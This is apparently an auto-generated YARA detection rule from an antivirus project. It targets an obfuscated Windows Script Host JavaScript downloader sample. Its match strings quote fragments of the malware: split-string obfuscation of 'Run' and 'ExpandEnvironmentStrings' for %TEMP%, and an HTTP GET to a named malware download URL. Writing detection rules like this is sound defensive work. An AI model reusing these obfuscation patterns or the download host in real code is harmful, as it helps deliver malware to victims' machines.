rule sig_20160428_6bd1baf229dc943b549ee56087927321 {
  meta:
    description = "datamaliciousorder - file 20160428_6bd1baf229dc943b549ee56087927321.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "decabcf3ab15ea63175d7729d03b6febba165edd8102a3f265417db9411d6433"

  strings:
    $s1  = "function AkvEiqQhsOybMsfGucScb(IqrDxpKmkEorFlnPnhXxa){FnbJmkDqwOdiEutQhrZtm[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function ItmMaaPpeWavAjcGklKdu() {return FnbJmkDqwOdiEutQhrZtm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function AkvEiqQhsOybMsfGucScb(IqrDxpKmkEorFlnPnhXxa){FnbJmkDqwOdiEutQhrZtm[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return KtcRemPynLqgUpqGycXiy - NaePovWjvAusPlhRitErd;};" fullword ascii
    $s5  = "function UhnZpbGjsSpjGrhUzvJvu(KtcRemPynLqgUpqGycXiy, NaePovWjvAusPlhRitErd){FrvJppArcKeaSfuYzkInc = FrvJppArcKeaSfuYzkInc * 1; " ascii
    $s6  = "var FnbJmkDqwOdiEutQhrZtm = function FbyImpLohPysMedLuyWyw() {return LikMmkOdqOjvQhiYitMoc[DtkIiiIbxBngRefNyaLuy](\"WScript\"+\"" ascii
    $s7  = "VurTbaDbzCybOsqLqmSqn[GxvFejWokGtkQjgVqhFky](\"G\" + \"ET\", \"http://minisupergame.ru/a9osfg\", false);" fullword ascii
    $s8  = "var LikMmkOdqOjvQhiYitMoc = this[\"WScript\"];" fullword ascii
    $s9  = "var FnbJmkDqwOdiEutQhrZtm = function FbyImpLohPysMedLuyWyw() {return LikMmkOdqOjvQhiYitMoc[DtkIiiIbxBngRefNyaLuy](\"WScript\"+\"" ascii
    $s10 = "function ItmMaaPpeWavAjcGklKdu() {return FnbJmkDqwOdiEutQhrZtm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function IhxWgsJwxFmpGxmVnyDsn(){return GxxZycCbgGjhCqnLosPfz + \"\";};" fullword ascii
    $s12 = "if (VurTbaDbzCybOsqLqmSqn[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function UhnZpbGjsSpjGrhUzvJvu(KtcRemPynLqgUpqGycXiy, NaePovWjvAusPlhRitErd){FrvJppArcKeaSfuYzkInc = FrvJppArcKeaSfuYzkInc * 1; " ascii
    $s14 = "function QjmGtkFxqMgxBmoBpjTlm() {return ((ChcFjjHelOvcMadHxwIck == true) && (ChcFjjHelOvcMadHxwIck == TonNyuRfdAnyPjlIrsZlw)) ?" ascii
    $s15 = "function QjmGtkFxqMgxBmoBpjTlm() {return ((ChcFjjHelOvcMadHxwIck == true) && (ChcFjjHelOvcMadHxwIck == TonNyuRfdAnyPjlIrsZlw)) ?" ascii
    $s16 = "TonNyuRfdAnyPjlIrsZlw = true; " fullword ascii
    $s17 = "var ChcFjjHelOvcMadHxwIck = false;" fullword ascii
    $s18 = "function VdaCirVdgEqhSdcJrjEjv(MgnGpyIorPdyQkjRqoPrd) {var NwsShnQqgXufSpuSjdSlr = (1, 2, 3, 4, 5, MgnGpyIorPdyQkjRqoPrd); retur" ascii
    $s19 = "function FwaJurBpkSpcSkjMoqJaj(){return DtkIiiIbxBngRefNyaLuy;};" fullword ascii
    $s20 = "var QttNiiGyrPugYasEbqVaq = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}